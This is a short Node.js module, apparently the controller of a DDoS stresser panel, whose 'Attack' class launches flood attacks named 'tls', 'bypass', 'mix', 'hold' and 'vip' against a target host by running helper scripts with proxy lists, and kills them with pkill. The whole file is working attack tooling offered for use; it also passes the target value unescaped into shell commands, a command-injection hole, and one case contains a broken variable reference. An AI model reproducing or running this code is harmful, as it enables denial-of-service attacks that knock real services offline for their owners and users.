const { all, get } = require("axios");
const {
    exec
} = require('child_process');
class Attack {
    static async send(host, port, time, method) {
        switch(method.toLowerCase()) {
            case "tls":
                all([
                    exec(`cd Method && node LOAD.js ${host} ${time} 10 10`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "bypass":
                all([
                    exec(`cd Method && node bypass.js ${host} ${time} 64 9 proxy.txt`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "mix":
                all([
                    exec(`cd Method && node MIXG.js ${host} ${time} 10 10 proxy.txt`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "hold":
                all([
                    exec(`cd Method && node nova.js ${host} ${time} 10 10 proxy.txt`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
                case "vip":
                all([
                    exec(`cd Method && ./thunders $host $time 10 10 proxy.txt 1`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "stop":
                all([
                    exec(`pkill ${host} -f`)
                ]);
                console.log(`Stoped Attack For ${host}`)
                break;
        }
    }
}

module.exports = Attack;